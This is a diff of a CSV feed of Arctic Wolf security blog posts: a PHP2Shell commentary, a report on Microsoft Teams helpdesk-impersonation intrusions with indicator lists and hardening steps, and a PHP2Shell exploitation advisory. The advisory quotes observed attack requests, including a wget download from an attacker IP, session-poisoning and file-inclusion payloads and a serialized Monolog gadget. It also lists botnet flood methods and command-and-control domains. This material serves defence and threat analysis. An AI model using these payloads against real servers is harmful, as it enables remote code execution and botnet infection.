@@ -1,5 +1,5 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
-6a43f535f02c,72375819775f,2026-10-26 18:04 UTC,General Security News,Arctic Wolf,Arctic Wolf Blog,AI Security; Vulnerability Management,Article,PHP2Shell Is a Wake-Up Call for Every Business Leader,https://arcticwolf.com/resources/blog/php2shell-is-a-wake-up-call-for-every-business-leader/,"AI is changing how vulnerabilities are discovered and exploited for defenders and attackers alike, and the practical effect is that the time organizations have between a flaw...","AI is changing how vulnerabilities are discovered and exploited for defenders and attackers alike, and the practical effect is that the time organizations have between a flaw being found and a flaw being exploited keeps shrinking. Today, we have more known vulnerabilities than at any point in history, and they’re being exploited faster than ever. Nearly 87% of exploited vulnerabilities in 2026 have been exploited before or on the day they were disclosed, up from 48% in 2024 and just 19% in 2018, according to zerodayclock.com, a neutral, independent observatory for cybersecurity telemetry.
+6a43f535f02c,2b62329cc6f4,2026-10-26 18:04 UTC,General Security News,Arctic Wolf,Arctic Wolf Blog,AI Security; Vulnerability Management,Article,PHP2Shell Is a Wake-Up Call for Every Business Leader,https://arcticwolf.com/resources/blog/php2shell-is-a-wake-up-call-for-every-business-leader/,"AI is changing how vulnerabilities are discovered and exploited for defenders and attackers alike, and the practical effect is that the time organizations have between a flaw...","AI is changing how vulnerabilities are discovered and exploited for defenders and attackers alike, and the practical effect is that the time organizations have between a flaw being found and a flaw being exploited keeps shrinking. Today, we have more known vulnerabilities than at any point in history, and they’re being exploited faster than ever. Nearly 87% of exploited vulnerabilities in 2026 have been exploited before or on the day they were disclosed, up from 48% in 2024 and just 19% in 2018, according to zerodayclock.com, a neutral, independent observatory for cybersecurity telemetry.
 
 More code, more bugs, and AI-aided discovery have all influenced this volume. The systems exposed are often the same systems that run revenue, operations, and customer relationships. Leaders now need to focus on something bigger than prevention alone. They need to build cyber resilience, the ability to withstand an attack, continue operating, and recover quickly. Every organization is racing against the clock to build that resilience.
 
@@ -38,7 +38,863 @@ We built Arctic Wolf for moments like this one. Internal staffing around the clo
 PHP2Shell won’t be the last vulnerability to remind us how quickly the threat landscape can change. This isn’t a risk to sleep on or push to next year’s budget. The time to act is now. The organizations that come through these moments will be the ones that understand their environments, maintain strong security fundamentals, and can respond decisively when new threats emerge. There has never been a better time to get proactive about cyber resilience.
 
 This blog reflects the author’s views as of the publication date and contains forward-looking statements and opinions about technology trends. Actual outcomes may differ based on attacker behavior, customer environments, and broader market and regulatory developments."
-5dc15e197e0d,72375819775f,2026-10-21 21:36 UTC,Vulnerabilities & Patching,Arctic Wolf,Arctic Wolf Blog,Vulnerability Management; Server & Workload Protection; Threat Intelligence,Article,"Arctic Wolf Labs: Finding, Prioritizing, and Patching PHP2Shell Exposure",https://arcticwolf.com/resources/blog/arctic-wolf-labs-finding-prioritizing-and-patching-php2shell-exposure/,"On Tuesday, October 20, threat actors gained advance visibility into two critical PHP vulnerabilities after details leaked ahead of the planned disclosure, accelerating the race...","On Tuesday, October 20, threat actors gained advance visibility into two critical PHP vulnerabilities after details leaked ahead of the planned disclosure, accelerating the race between defenders and attackers. The flaws are tracked as Common Vulnerabilities and Exposures (CVE) identifiers CVE-2026-109618 and CVE-2026-109619. Together they’re known as PHP2Shell. Both carry a 9.2 rating on the Common Vulnerability Scoring System (CVSS) version 4.0 scale. For both vulnerabilities, Arctic Wolf’s Aurora® Agentic SOC helps organizations rapidly identify affected assets, correlate exploitation signals across the environment, and accelerate investigation and response before attackers can establish persistence.
+257572f9eb42,257572f9eb42,2026-10-26 12:57 UTC,"Attacks, Breaches & Threat Intel",Arctic Wolf,Arctic Wolf Blog,Email and Collaboration Security; Threat Intelligence,Article,Beyond the Inbox: How Threat Actors Abuse Microsoft Teams External Chat for Initial Access,https://arcticwolf.com/resources/blog/threat-actors-abuse-microsoft-teams-external-chat-for-initial-access/,"This activity does not exploit any known Teams vulnerability; it abuses a legitimate, default-on collaboration capability","Summary
+
+Arctic Wolf Labs has observed a recurring social engineering pattern in hundreds of cases where threat actors have used Microsoft Teams’ external chat creation feature for impersonation scams, or to deliver malicious files. A consistent pattern of attacker behavior has emerged across these incidents: the use of the same throwaway tenants, the same “IT Support (Internal)” display names, the same remote-access tools, and increasingly, the same payload domains.
+
+In this report, we’ll explore our findings, examine how attackers weaponize the external access / federation feature in Teams to reach employees, reveal the infrastructure identified through Arctic Wolf’s telemetry, and discuss the defensive measures organizations can take to disrupt this attack chain.
+
+Key Findings
+
+Arctic Wolf analyzed more than 400 incidents involving abuse of the Microsoft Teams external chat functionality for social engineering activity and initial access.
+
+Threat actors repeatedly used highly consistent IT-support impersonation tactics, including IT-themed display names, friendly-sounding first names, and “(Internal)” labels designed to undermine external-user warnings in Teams.
+
+We observed a measured infrastructure shift, from disposable .onmicrosoft[.]com tenants toward attacker-controlled domains, with .top domains accounting for roughly half of observed paid-domain cases.
+
+Arctic Wolf detects this activity at the ChatCreated stage, creating a window of opportunity to identify and disrupt attacks before a victim engages with the threat actor.
+
+Context
+
+Microsoft Teams ships with external access (federation) turned on by default, meaning any Teams user in another Microsoft 365 tenant can find, chat with, and call an organization’s employees, provided both tenants allow external access. This is the feature attackers most frequently abuse. This activity does not exploit any known Teams vulnerability; it abuses a legitimate, default-on collaboration capability.
+
+How Threat Actors Establish Teams Identities
+
+Threat actors commonly establish external Teams identities through newly created or acquired Microsoft 365 tenants. Between 30 to 40 percent of the cases we analyzed involved default *.onmicrosoft[.]com tenant domains. This default domain requires no verification and can be provisioned within minutes, giving attackers a functioning Teams identity with minimal setup.
+
+Arctic Wolf observed that, even when using this default domain, attackers engineer the tenant’s sender name to read as IT infrastructure. We have supplied a list of the default *.onmicrosoft[.]com tenant names observed in use across multiple customers in the Appendix at the end of this report [1].
+
+Arctic Wolf assesses that threat actors typically select a support-, IT-, admin-, network-, or helpdesk-themed word as the tenant name, optionally suffixed with the number 365, or the words online, portal, or a random number, to obtain a free tenant name. In a smaller number of cases, Arctic Wolf observed threat actors using legitimate company names in the sender’s tenant name to increase their credibility.
+
+How the Attack Unfolds
+
+In a significant number of cases, customers reported that the malicious Teams contact was preceded or accompanied by “mail bombing”, the flooding of a victim’s inbox with hundreds of newsletter or subscription confirmations within minutes. The email storm is intended to manufacture urgency and bury legitimate emails such as security alerts, with the Teams “IT support” message arriving moments later to offer to resolve the very same problem the attacker just created.
+
+This reflects an abuse of trust: employees are generally trained to treat email with suspicion, but a message delivered from inside their Teams instance bypasses that learned caution.
+
+Beyond email masquerading, Arctic Wolf identified a range of consistent naming techniques used by threat actors across customer alerts. The attacker’s Teams display name is central to the deception. Arctic Wolf observed the following impersonation display names most frequently, meaning the pattern occurs across multiple cases: [2]
+
+Attackers append “(Internal)” to the display name so the recipient perceives the message as coming from an internal IT sender, even though Teams simultaneously labels the sender as External.
+
+Reoccurring usage of friendly-sounding names, such as “IT Service Desk – Liam , IT Support (Scott McGhee)”, or “IT Service Desk (Matthew)”. Here, adding a first name makes the Teams message appear to come from a real member of their organization’s Service Desk.
+
+In several cases, attackers used region-specific naming conventions tailored to the target’s locale: for example, “Supporte TI,” the French/Spanish variant of “IT Support.”
+
+We observed roughly 100+ emoji markers ( 🛡 shield, 🛠️/🔧 tools, ✅ check) used in attacker display names: e.g., “IT Support 🛡| Corporate IT Service 🛠 (Internal).” This may be evidence of the use of AI such as ChatGPT and AI-related automation to create content and identities in support of this campaign.
+
+Most recently, we observed the attacker/external Teams user adding the target organization’s domain or company name in their own display name to make the message appear more legitimate.
+
+We also observed a recent shift toward paid top-level domains (TLDs) for tenant creation. Of the paid domains we identified in these types of scams over the past few months, approximately 50 percent of fake identities used the .top TLD, around 40 percent used a standard .com domain, and just over five percent used multi-level domains such as .com.pl, .com.vn, and .com.br.
+
+This aligns with Sophos’s reporting on the STAC4749 / Chaos ransomware campaign, which found that attackers have moved away from onmicrosoft[.]com throwaway tenants and toward IT-themed .top domains for payload staging and command-and-control (C2), as the low cost of .top registrations allows for convincing “update/ security/support” hostnames. Arctic Wolf also observed repeated use of other common TLDs, including .com.br and .com.vn in activity reported during July and August.
+
+In a subset of these custom domains, attackers deliberately configured DNS records to redirect web requests to the legitimate Microsoft or victim organization site to appear authentic.
+
+Attack Chain for Teams Chat Creation
+
+Attackers target organizations where external access is enabled. Chat creation itself is only the entry point. Arctic Wolf assesses that, once trust is established, the attacker’s immediate goal in most cases is to obtain hands-on-keyboard access through a legitimate remote monitoring and management (RMM) tool.
+
+We also frequently observed attackers using vishing (a direct voice call to the victim from within Teams) to secure RMM installation. In cases where attackers target multiple victims simultaneously, typically via automation, the initial contact begins with a Teams chat message instead of a call. The most commonly observed RMM tools used in relation to this scam were Quick Assist (QuickAssist.exe / msra.exe), AnyDesk, ScreenConnect (ConnectWise), TeamViewer, Atera, Zoho Assist, NetSupport, and LogMeIn.
+
+Of these, Quick Assist is the most frequently used. This may be because it is built into Windows, signed by Microsoft, requires no installation, and only requires the victim to read back a six-digit code. When attackers seek persistence beyond the initial call, they pivot to a commercial RMM tool (AnyDesk, Atera, ScreenConnect, or a second platform such as Level, installed via msiexec), which provides an independent control channel that survives remediation of the original implant.
+
+Arctic Wolf identified a consistent attack chain across successful exploitation cases and correlated it with chains previously documented by security vendors such as Microsoft and Zscaler:
+
+Attackers commonly target multiple users within short windows of time (approximately five minutes) to increase the likelihood of success, most likely performed through automation. Once a victim engages, the attack chain reported by customers shows threat actors reaching payload execution in under 15 minutes. Arctic Wolf observed similar compression in its own data: several cases recorded concurrent credential-access detections (Kerberoasting, GoldenPAC-related) firing alongside the initial Teams alert, indicating the endpoint was already compromised by the time the chat alert was triaged.
+
+In a subset of cases, attackers leveraged Microsoft’s notes. Attackers generally avoid pasting a URL directly into Teams, which would trigger Safe Links / ZAP scanning, and instead navigate to the payload themselves during the remote session. Consequently, endpoint and identity telemetry are essential monitoring surfaces alongside message scanning.
+
+How Teams Chat Abuse Works
+
+Threat actors using external Teams chat as an initial-access vector is not new. The practice was first documented by Microsoft in the Black Basta (Storm-1811) campaign in mid-2024, which used the now-familiar chain of email bombing → external Teams “help desk” → Quick Assist → QakBot/DarkGate/Cobalt Strike → ransomware.
+
+The technique was later observed in the Cactus campaign and in 3AM and Chaos. Earlier this year, Zscaler reported on the GoGRPC campaign, in which Teams vishing and Quick Assist were used to deploy the GoGRPC backdoor.
+
+Example Attack Observed by Arctic Wolf
+
+Arctic Wolf recently identified a potentially novel infection chain leveraging external Microsoft Teams chat messages, in which the threat actor posed as an IT helpdesk employee to initiate the attack. In the case we observed, the attacker instructed the user to run a PowerShell command and launch the downloaded file. The initial payload retrieval was performed via PowerShell, and both actions executed under the victim’s account with a parent process of explorer.exe, reminiscent of ClickFix, though not disguised as a CAPTCHA.
+
+Next, the PowerShell command downloads an MSI from Azure Blob Storage, which bundles a PowerShell script and a ZIP archive (archive6.zip). Approximately 30 seconds after the MSI is launched by the user, the bundled PowerShell script (cleaner.ps1) is dropped into the users’ AppData folder (AppData\Local\PowershellCleaner\scripts) and executed. The script cleaner.ps1 contains a large array of hexadecimal characters, preceded by an IEX instruction to execute the joined and decoded array; the resulting plain code is a loader that reads a block of AES-encrypted data, decrypts it using hard-coded key/IV and computes its hash. If the hash matches a hard-coded value, the resulting PowerShell is executed via ScriptBlock.
+
+Ultimately, this is an obfuscated decryption and execution stub to build and run an additional PowerShell payload. The purpose of this final payload is to extract the pythonw interpreter and implant (ss.py), both from the bundled archive6.zip. After sleeping for five seconds, the implant is executed via pythonw.exe.
+
+The implant then starts another MSI transaction that issues LDAP queries to Active Directory for all computer and user objects (filtering for both Category and Class) using the System.DirectoryServices.DirectorySearcher PowerShell shortcut adsisearcher, formatting the attribute output as [sAMAccountName] – [description]. This information is then transmitted to C2 server endpoints that are randomly selected from a list of domains and URIs laid out in the implant’s code.
+
+How Arctic Wolf Protects its Customers
+
+From the newly created tenant, the attacker initiates a one-on-one chat, which avoids the visibility associated with group conversations. Microsoft records this first contact as a ChatCreated event, which Arctic Wolf assesses to be the primary detection opportunity for defenders. Our alerts most frequently fire exactly here, before the user has done anything.
+
+Arctic Wolf combines multiple detection engines to identify suspicious external Teams chats. Drawing on observations from thousands of customer environments, Arctic Wolf maintains indicators of compromise (IOCs) associated with these campaigns, including impersonation-focused display names such as IT Helpdesk and Helpdesk Support as well as attacker-controlled tenant and domain patterns.
+
+Arctic Wolf’s behavioral engine also monitors Microsoft tenants that initiate conversations with multiple Arctic Wolf customers. When activity from a tenant, account, or domain appears anomalous, particularly when combined with other signals such as email bombing or suspicious follow-on activity, Arctic Wolf flags it for investigation.
+
+Arctic Wolf also tracks top-level domains that threat actors commonly use to create tenants, host payloads, or support command-and-control infrastructure.
+
+Beyond monitoring the initial Teams-based social engineering lure, Arctic Wolf maintains detections for the remote monitoring and management (RMM) tools that attackers frequently push during these engagements. Arctic Wolf alerts on the execution of RMM tools that are not sanctioned or expected within a given environment, since the unauthorized installation of legitimate remote access software is a common technique used to establish persistence once a victim has been convinced to grant access.
+
+Arctic Wolf also correlates behavior over time, flagging cases where an RMM tool installation is followed by reconnaissance commands, such as enumerating users, groups, or network configuration, and prioritizing these for investigation.
+
+Conclusion
+
+External Microsoft Teams chat has become an effective initial-access vector because it exploits trust rather than a software vulnerability.
+
+Arctic Wolf has been able to monitor and protect our customers from these attacks with proactive defenses. Across the activity examined, attackers combined email bombing, convincing IT-support impersonation, newly created tenants and domains, and rapid social engineering to move victims from a seemingly routine chat to remote access, payload execution, and, in some cases, broader compromise.
+
+The recurring patterns provide defenders with valuable opportunities to interrupt the attack chain. An unexpected chat from an external tenant, particularly one that follows an inbox flood or uses an IT-themed display name, should be treated as suspicious. Correlating ChatCreated events with endpoint, identity, email, domain, and remote-access telemetry can reveal the progression even when the initial interaction appears benign.
+
+Defensive Countermeasures for Organizations
+
+Most organizations have no legitimate need for open, any-tenant external chat. Per Microsoft’s guidance in Manage external meetings and chat with people and organizations using Microsoft identities, move from “allow all” to an allow-list of trusted organizations. Organizations can take the following proactive steps:
+
+In Teams admin center → Users → External access, select “Allow only specific external domains” and add only the partner domains the organization actively collaborates with. Once an allow-list is configured, all other domains are blocked by default.
+
+Block chat with unmanaged / Teams-consumer accounts, and disable the option that lets unmanaged users start conversations with your users.
+
+Block federation with trial-only tenants, as attackers commonly prefer free or trial tenants for their minimal setup requirements:
+
+Set-CsTenantFederationConfiguration -ExternalAccessWithTrialTenants ""Blocked""
+
+Enable “Allow my security team to manage blocked domains” so the security team can push blocks (e.g., the .top indicators listed in this report) through the Microsoft Defender Tenant Allow/Block List → Teams domains tab.
+
+Harden the remote-access path: block or restrict Quick Assist to authorized IT roles (or remove it where unused), and block or uninstall unsanctioned RMM tools (AnyDesk, TeamViewer, ScreenConnect, Atera, Level, Splashtop) via Defender for Endpoint or application control. Alert on any RMM tool not deployed through the Arctic Wolf agent.
+
+Because this attack vector relies on social engineering rather than technical exploitation, people and process controls are critical to closing the gap:
+
+Out-of-band verification for all remote-access requests. Mandate a callback to the user’s registered number or an approval flow in a separate trusted app. An impersonator controlling the Teams channel can’t complete a verification that lives outside it.
+
+Tell staff exactly how real IT reaches out (which channels, which domains, which named contacts), and that unsolicited external “IT support” is inherently suspicious (especially if it appears right after an inbox spam flood).
+
+Train users to read the External tag and the real sender domain, and to never dismiss the Accept/Block, Safe Links, or first-contact warnings. Provide side-by-side examples of the organization’s real help desk communications versus an impersonator’s.
+
+Conduct targeted training for personnel regarding the specific social engineering tactics used in this campaign. For those without the time to devote to creating security training resources from scratch, the Arctic Wolf Aurora® Managed Security Awareness and Training solution delivers easily digestible security lessons for employees, including regular phishing simulations and a “Report Phish” button.
+
+Microsoft is also clearly taking this threat seriously too. They’ve now built end-user reporting for security directly into Teams, letting employees report a suspicious message or an external user with a couple of clicks.
+
+MITRE ATT&CK® Mapping
+
+Tactic
+
+Technique (ID)
+
+Observed
+
+Resource Development
+
+Acquire Infrastructure: Domains (T1583.001)
+
+Cheap disposable .top domains dominate (getitconnect[.]top, get-help-systems[.]top, helpdesk-sys[.]top, help-desk-get[.]top, fix-it[.]top), plus lure domains on .icu, .online, .report, .zip.
+
+Resource Development
+
+Establish Accounts: Cloud Accounts (T1585.003)
+
+Throwaway *.onmicrosoft[.]com tenants with IT-themed names (helpdeskteam365, itcoreportal, supportedge33, networkadmin916).
+
+Resource Development
+
+Establish Accounts: Email Accounts (T1585.002)
+
+Attacker-created sender mailboxes used to initiate contact.
+
+Initial Access
+
+Phishing: Spearphishing via Service (T1566.003)
+
+External Microsoft Teams 1:1 chat from an unknown/external tenant (ChatCreated).
+
+Initial Access
+
+Phishing: Spearphishing Voice / Vishing (T1566.004)
+
+Voice/phone social engineering accompanying the Teams contact (help desk callback pretext).
+
+Initial Access
+
+Phishing (T1566) — email-bombing (T1667) precursor
+
+Mail-bomb / spam flood immediately preceding the “help desk” outreach to manufacture urgency.
+
+Initial Access
+
+Trusted Relationship (T1199)
+
+Abuse of default-on Teams external access / cross-tenant federation to reach internal users.
+
+Initial Access
+
+Impersonation (T1656)
+
+Sender display names impersonating internal IT (“Help Desk”, “IT Support”, “IT-Representative”, “Help Desk Manager”).
+
+Execution
+
+User Execution: Malicious File (T1204.002)
+
+.msi / .exe staging bundles or scripts delivered via Teams chat files; hands-on execution confirmed only in the few events where the user engaged.
+
+Execution
+
+Command and Scripting Interpreter: PowerShell (T1059.001)
+
+PowerShell payload download/staging described as the expected post-access step
+
+Defense Evasion
+
+Masquerading (T1036)
+
+Lure files/domains styled as legitimate IT/support assets.
+
+Command and Control
+
+Remote Access Software (T1219)
+
+Quick Assist, AnyDesk, TeamViewer, ScreenConnect/ConnectWise remote-access tooling observed across these cases
+
+Command and Control
+
+Ingress Tool Transfer (T1105)
+
+Download/staging of follow-on tools once remote access is granted.
+
+Appendix [1]
+
+NOTE: Arctic Wolf assesses that the following domains seen in relation to these attacks are all fake and are not real Microsoft domains.
+
+Attacker Tenant (Default *.onmicrosoft[.]com tenant names observed by Arctic Wolf across multiple intrusions)
+
+supportedge33[.]onmicrosoft[.]com / supportedge39[.]onmicrosoft[.]com
+
+helpdeskteam365[.]onmicrosoft[.]com
+
+itendpoint365[.]onmicrosoft[.]com
+
+itcoreportal[.]onmicrosoft[.]com
+
+networkadmin797[.]onmicrosoft[.]com / networkadmin916[.]onmicrosoft[.]com
+
+itadmin922[.]onmicrosoft[.]com
+
+supportagentonline[.]onmicrosoft[.]com
+
+threatpro[.]onmicrosoft[.]com
+
+ithelpplus42[.]onmicrosoft[.]com
+
+corporateitservicellc[.]onmicrosoft[.]com
+
+techsupport2337[.]onmicrosoft[.]com
+
+Appendix [2]
+
+Display Name/ Pattern Used by Threat Actors
+
+Help Desk
+
+IT Support
+
+HelpDesk Manager
+
+IT Service Desk – Liam / IT Service Desk (Liam)
+
+IT Service Desk – Matt / IT Service Desk – Scott
+
+IT Support – Christopher Thomas
+
+HelpDesk Supervisor
+
+Enterprise IT & Security (Internal)
+
+IT Tech Support Internal
+
+Business IT Solutions & Support (Internal)
+
+Maintenance Service
+
+IT-Representative
+
+IT/Help Desk
+
+IT/”update”-Themed .top Payload and C2 Infrastructure
+
+update-software[.]top
+
+infoupdate-it[.]top
+
+soft-program[.]top
+
+getsysmonitor[.]top
+
+programupdate-assis[.]top
+
+expertassist[.]top
+
+sec-check-it[.]top
+
+upd-check-soft[.]top
+
+assis-programupdate[.]top
+
+get-info-check[.]top
+
+updsysseq[.]top
+
+techrelay[.]top
+
+verifsec-update[.]top
+
+sys-update-check[.]top
+
+get-help[.]top
+
+it-assistant[.]top
+
+ms-system-check[.]top
+
+scan-updseq[.]top
+
+it-seccontrol[.]top
+
+verifcontrol-update[.]top
+
+get-upd-sys[.]top
+
+get-sys-info[.]top
+
+getsystembridge[.]top
+
+data-sys-seq[.]top
+
+soft-network[.]top
+
+Help-Desk Lookalike .com Domains (Classic Impersonation Infra)
+
+helpdesk-support-us-ny[.]com
+
+helpdesk-support-office-3[.]com
+
+helpdesk-support-office-4[.]com
+
+helpdesk-support-us3[.]com
+
+helpdesk-call[.]com
+
+helpdesk-s1x[.]com
+
+itdeskassist[.]com
+
+Notable Payload/Credential-Phish Domains Seen Repeatedly
+
+kilan[.]com[.]pl
+
+saludcentro[.]gov[.]co
+
+ggc[.]com[.]ph
+
+scapini[.]com[.]br
+
+References:
+
+Microsoft: Cross-tenant helpdesk impersonation to data exfiltration
+
+Microsoft Teams admin: Manage external meetings and chat (trusted organizations)
+
+Zscaler ThreatLabz: Helpdesk Hijackers: Teams Vishing, Quick Assist, and GoGRPC
+
+Sophos: Chaos in Teams vishing (STAC4749)
+
+ReliaQuest: Former Black Basta affiliates automating executive targeting
+
+BleepingComputer: Teams tactics connect Black Basta and Cactus ransomware
+
+UNC6692: How UNC6692 Employed Social Engineering to Deploy a Custom Malware Suite | Google Cloud Blog
+
+Additional Arctic Wolf Resources:
+
+Read related blog: Black Basta Ransomware Group Affiliates Leveraging Windows Quick Assist for Initial Access
+
+Subscribe to Arctic Wolf’s Threat Intelligence newsletter: ThreatPulse Community Edition
+
+Arctic Wolf Tech Den
+
+Arctic Wolf Blog
+
+Legal disclaimer: Attribution reflects Arctic Wolf Labs’ assessment as of the report period and may evolve with new evidence. References to threat actor identity, nexus, and intent are analytical judgments, not statements of legal fact. This alert is provided for informational purposes only and does not constitute a guarantee of detection or prevention. Defensive effectiveness varies by environment, configuration, and available telemetry."
+71c0db269fe8,2b62329cc6f4,2026-10-22 18:44 UTC,Vulnerabilities & Patching,Arctic Wolf,Arctic Wolf Blog,Vulnerability Management; Server & Workload Protection; Endpoint Security,Article,PHP2Shell: Critical PHP Vulnerabilities Enable Unauthenticated Remote Code Execution,https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/,"Arctic Wolf Labs leverages resulting artifacts from these simulations, as well as observed exploit techniques, attacker tradecraft, and emerging indicators of attack/compromise...","Executive Summary
+
+On October 21, 2026, the PHP development team released emergency security updates addressing two critical vulnerabilities, CVE-2026-109618 and CVE-2026-109619, collectively referred to by researchers as PHP2Shell. Both vulnerabilities carry a CVSS v4.0 score of 9.2 (Critical Severity) and can allow an unauthenticated attacker to execute code with the privileges of the affected PHP worker process.
+
+The vulnerabilities affect PHP installations that process web requests, including PHP-FPM, Apache deployments using mod_php, php-cgi, FrankenPHP, and LiteSpeed. The PHP security team considers Apache mod_php the highest-risk configuration because researchers demonstrated exploitation through a single unauthenticated request before application code begins executing.
+
+Key findings
+
+Arctic Wolf Labs observed widescale scanning and active exploitation attempts targeting PHP2SHELL shortly after disclosure. Activity ranged from basic checks for vulnerable PHP session upload-progress behavior, to attempts to validate PHP and operating system (OS) command execution.
+
+Observed scanners used several techniques to validate exposure. These included inert PHP canaries, unique output markers, attacker-controlled session identifiers, session-poisoning attempts, and local-file-inclusion chains designed to determine whether injected PHP content could be evaluated.
+
+Arctic Wolf Labs identified likely weaponized exploitation attempts involving second-stage payload delivery. Requests associated with 92.118.112[.]100 attempted to collect host and process-account information, print execution-confirmation markers, change to /tmp, and retrieve additional files using wget.
+
+Analysis of the associated infrastructure identified payloads linked to the Potassium botnet. The investigation also uncovered Ethereum Name Service records containing recently updated IP addresses, although the available evidence does not show that the malware retrieved or used those records operationally.
+
+Details
+
+Arctic Wolf Labs observed a likely weaponized PHP2Shell exploitation attempt that combined command-execution validation with second-stage payload delivery. The request attempted to run id, print the marker PHP2SHELL_CONFIRMED, change to /tmp, and download a file from external IP address 92.118.112[.]100. The command sequence appeared repeatedly across padded form fields, potentially to influence memory layout or improve exploit reliability.
+
+echo PHP2SHELL_CONFIRMED;cd /tmp; wget hxxp://92.118.112[.]100/nfs-setup
+
+We observed a second weaponized payload associated with the same server. Embedded within repeated, heavily padded multipart fields, the command sequence attempted to enumerate the operating system and execution account, print a distinctive marker, and download an additional file from the previously observed payload host. The attempted second-stage delivery distinguishes this activity from non-destructive vulnerability validation and indicates clear exploitation intent.
+
+system.uname -a; id; echo REDACTED OFFENSIVE;wget hxxp://92.118.112[.]100/REDACTED OFFENSIVE;
+
+Further analysis of the payload-hosting infrastructure identified two malicious binaries associated with Potassium, a Mirai-derived botnet family first identified in March 2026 by Synthient and named after its C2 subdomain. Available telemetry did not establish that the observed PHP2Shell requests downloaded or executed either sample.
+
+Payload Infrastructure Analysis
+
+ARM variant
+
+X86-64 variant
+
+Built for
+
+ARM (routers, cameras, DVRs)
+
+x86-64 (servers, small boxes)
+
+Size
+
+215 KB
+
+175 KB
+
+Attack vectors
+
+24
+
+Remote shell
+
+Not identified
+
+Yes
+
+Command and Control
+
+thunder[.]godofthunder[.]st
+
+Same
+
+Updates from
+
+hackattackkaboom[.]botlesscucks[.]st
+
+Same
+
+Shared Builder and Execution Flow
+
+The ARM and x86 samples contain the same 32-byte encryption key and 12-byte nonce, providing strong evidence that they originated from a shared builder. Both use these values to encrypt operational strings, including command-and-control domains, file paths, shell and process names, and the process kill list.
+
+Further Arctic Wolf Labs research into the payloads identified new capabilities not previously reported, which are listed below.
+
+New Attack Vectors
+
+ID
+
+Name
+
+Socket
+
+Notes
+
+1
+
+udp
+
+UDP
+
+per-target socket, sendto loop
+
+2
+
+udpplain
+
+UDP
+
+plain UDP flood
+
+3
+
+syn
+
+RAW
+
+crafted TCP SYN, IP_HDRINCL
+
+4
+
+ack
+
+RAW
+
+crafted TCP ACK
+
+5
+
+socket
+
+TCP
+
+connection flood, sockets held open
+
+6
+
+openvpn
+
+RAW
+
+OpenVPN protocol flood
+
+7
+
+udphex
+
+UDP
+
+hex-encoded payload
+
+8
+
+ragnarok
+
+UDP
+
+verified socket type only
+
+9
+
+pshack
+
+RAW
+
+TCP PSH+ACK
+
+10
+
+icmp
+
+RAW
+
+ICMP flood
+
+11
+
+gre
+
+RAW
+
+GRE encapsulated
+
+12
+
+sack
+
+RAW
+
+banner TCP SYN+ACK flood!
+
+13
+
+game
+
+UDP
+
+banner UDP Game flood (SOCK_DGRAM – stable)!
+
+14
+
+fivem
+
+UDP
+
+FiveM/GTA, CitizenFX/1 user agent
+
+15
+
+tcpmix
+
+RAW
+
+mixed TCP flag combinations
+
+16
+
+udpbypass
+
+UDP
+
+banner UDP Bypass flood (SOCK_DGRAM – stable)!
+
+17
+
+tcpfml
+
+RAW
+
+banner TCP FML!
+
+18
+
+katakomba
+
+RAW
+
+banner TCP KATAKOMBA!
+
+19
+
+trapaholic
+
+mixed
+
+largest handler, 33 KB decompiled
+
+20
+
+http
+
+TCP
+
+HTTP flood, random paths and extensions
+
+21
+
+udpcn
+
+RAW
+
+verified socket type only
+
+22
+
+javaclient
+
+TCP
+
+Minecraft Java protocol, socket-loop
+
+23
+
+tcpcn
+
+RAW
+
+verified socket type only
+
+24
+
+tlshttp
+
+none
+
+STUB, does nothing
+
+Ethereum Name Service Resolution
+
+Both builds contain configuration for resolving command-and-control infrastructure through Ethereum Name Service (ENS), including two .eth names, seven public Ethereum RPC endpoints, and 32 text-record keys labeled “ip” through ip32. This would allow the malware to retrieve multiple command-and-control addresses without relying on conventional DNS.
+
+ENS resolution was disabled in both samples, indicating that the capability was present but inactive. If enabled in future variants, it could complicate disruption by reducing reliance on registrars and DNS providers, requiring defenders to block the ENS names, RPC infrastructure, and resolved command-and-control addresses.
+
+From Canaries to Command Execution
+
+Following public disclosure, Arctic Wolf Labs observed widespread automated activity targeting PHP’s session upload-progress functionality. The requests ranged from basic checks for vulnerable behavior to session-poisoning chains and explicit attempts to validate operating-system command execution.
+
+The variation in request structure, markers, session identifiers, and payloads indicates that multiple scanners and proof-of-concept (PoC) implementations were active. Although these requests demonstrate increasingly aggressive exploitation intent, request telemetry alone does not establish that the targeted systems were vulnerable or that code execution succeeded.
+
+Probing the Upload-Progress Code Path
+
+Some scanners performed basic checks intended to reach the affected PHP request-processing path. One self-identifying scanner supplied a controlled session identifier, activated PHP’s upload-progress functionality, and uploaded approximately 63 KB of repetitive data.
+
+User-Agent: php2shell-scan/109618 Cookie: PHPSESSID=<REDACTED_SESSION_ID> Content-Type: multipart/form-data; boundary=B7kQpoc618 Content-Length: 62935 Connection: close
+
+–B7kQpoc618 Content-Disposition: form-data; name=”PHPSESSID”
+
+<REDACTED_SESSION_ID> –B7kQpoc618 Content-Disposition: form-data; name=”PHP_SESSION_UPLOAD_PROGRESS”
+
+x –B7kQpoc618 Content-Disposition: form-data; name=”f”; filename=”a” AAAA…[truncated]…
+
+The repetitive file content may have been intended to exercise the vulnerable upload-processing path or validate exploit prerequisites. The request did not contain executable PHP or an operating-system command, making it more consistent with vulnerability probing than an attempt to deliver a final payload.
+
+Testing Session Poisoning and File Inclusion
+
+Other requests tested whether attacker-controlled PHP could be written into session upload-progress data and subsequently evaluated through a local file inclusion vulnerability.
+
+One request supplied a predictable session identifier and attempted to include the corresponding session file through a page parameter:
+
+POST /vuln.php?page=/var/lib/php/session/sess_p2sopchain000000000000 HTTP/1.1
+
+The request embedded the following PHP in uploaded filename metadata:
+
+<?php echo ‘P2SOP-‘.PHP_VERSION. ‘-EXEC-‘.php_uname(‘n’). ‘-WPC-‘.intval(@file_exists(‘wp-content/db.php’)); ?>
+
+If successfully stored and evaluated, the payload would return the PHP version, server hostname, and the result of a check for a WordPress-related file. The request exposes the scanner’s intended exploit chain, but it does not prove that the supplied session path matched the target’s configuration or that the application included the session file.
+
+Session Poisoning Versus PHP2Shell Exploitation
+
+Arctic Wolf Labs also observed requests that appeared to conflate PHP2Shell with older PHP session-poisoning techniques. One example activated PHP’s upload-progress functionality and embedded a serialized Monolog object within uploaded filename metadata:
+
+Cookie: PHPSESSID=pcw8189d05b0b3e4ffb PHP_SESSION_UPLOAD_PROGRESS=x filename=”x|O:32:\”Monolog\Handler\SyslogUdpHandler\”…”
+
